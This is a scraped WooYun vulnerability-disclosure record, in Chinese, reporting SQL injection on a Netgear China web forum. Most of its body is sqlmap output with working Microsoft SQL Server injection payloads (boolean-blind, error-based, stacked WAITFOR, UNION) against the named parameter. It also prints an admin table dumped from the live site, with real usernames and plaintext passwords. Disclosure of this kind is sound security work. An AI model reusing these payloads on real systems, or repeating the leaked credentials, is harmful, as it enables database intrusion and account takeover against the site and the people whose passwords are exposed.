{"id": 75768, "wybug_id": "wooyun-2016-0166475", "wybug_title": "Netgear(美国网件)中国分公司SQL注入", "wybug_corp": "Netgear", "wybug_author": "r3d0x8", "wybug_date": "2016-01-02 00:18", "wybug_open_date": "2016-02-22 21:19", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-22：\t细节向公众公开  简要描述： 2016，加油挖洞！ 详细说明：  之前wooyun已有提交类似的：http://**.**.**.**/bugs/wooyun-2010-025854通过注出的数据库名和用户分析，目测不是同一个分站，注入点肯定是不同的。\n\n\n\nURL:\nhttp://**.**.**.**/bbs_detail.asp?id=197\n后面加1=1，返回正常\nhttp://**.**.**.**/bbs_detail.asp?id=197 and 1=1\n加1=2，返回错误\nhttp://**.**.**.**/bbs_detail.asp?id=197 and 1=2\n   漏洞证明：  \nsqlmap identified the following injection point(s) with a total of 45 HTTP(s) requests:---Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=197 AND 5085=5085    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: id=197 AND 7240=CONVERT(INT,(SELECT CHAR(113)+CHAR(98)+CHAR(118)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (7240=7240) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(113)))    Type: inline query    Title: Microsoft SQL Server/Sybase inline queries    Payload: id=(SELECT CHAR(113)+CHAR(98)+CHAR(118)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (5777=5777) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(113))    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: id=197;WAITFOR DELAY '0:0:5'--    Type: UNION query    Title: Generic UNION query (NULL) - 8 columns    Payload: id=-6835 UNION ALL SELECT NULL,NULL,CHAR(113)+CHAR(98)+CHAR(118)+CHAR(113)+CHAR(113)+CHAR(90)+CHAR(70)+CHAR(77)+CHAR(68)+CHAR(110)+CHAR(104)+CHAR(81)+CHAR(73)+CHAR(72)+CHAR(114)+CHAR(113)+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(113),NULL,NULL,NULL,NULL,NULL-- ---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2008sqlmap resumed the following injection point(s) from stored session:---Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=197 AND 5085=5085    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: id=197 AND 7240=CONVERT(INT,(SELECT CHAR(113)+CHAR(98)+CHAR(118)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (7240=7240) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(113)))    Type: inline query    Title: Microsoft SQL Server/Sybase inline queries    Payload: id=(SELECT CHAR(113)+CHAR(98)+CHAR(118)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (5777=5777) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(113))    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: id=197;WAITFOR DELAY '0:0:5'--    Type: UNION query    Title: Generic UNION query (NULL) - 8 columns    Payload: id=-6835 UNION ALL SELECT NULL,NULL,CHAR(113)+CHAR(98)+CHAR(118)+CHAR(113)+CHAR(113)+CHAR(90)+CHAR(70)+CHAR(77)+CHAR(68)+CHAR(110)+CHAR(104)+CHAR(81)+CHAR(73)+CHAR(72)+CHAR(114)+CHAR(113)+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(113),NULL,NULL,NULL,NULL,NULL-- ---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2008current user is DBA:    Truesqlmap resumed the following injection point(s) from stored session:\n管理员密码是明文，帐号kelvin.liu可以直接登录\nTable: ASKPUB_Admin[3 entries]+----+------------------+-----------+-------------+| id | qx               | pass      | name        |+----+------------------+-----------+-------------+| 35 | 6, 5, 4, 3, 2, 1 | 111111    | admin       || 4  | 0                | H6N7mBer  | QAChina2013 || 7  | 6, 5, 4, 3, 2, 1 | Utm15088! | kelvin.liu  |+----+------------------+-----------+-------------+\n   修复方案：  过滤吧！   版权声明：转载请注明来源 r3d0x8@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：9  确认时间：2016-01-08 21:19 厂商回复： CNVD确认所述漏洞情况，暂未建立与网站管理单位的直接处置渠道，待认领。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 9, "Ranks": null}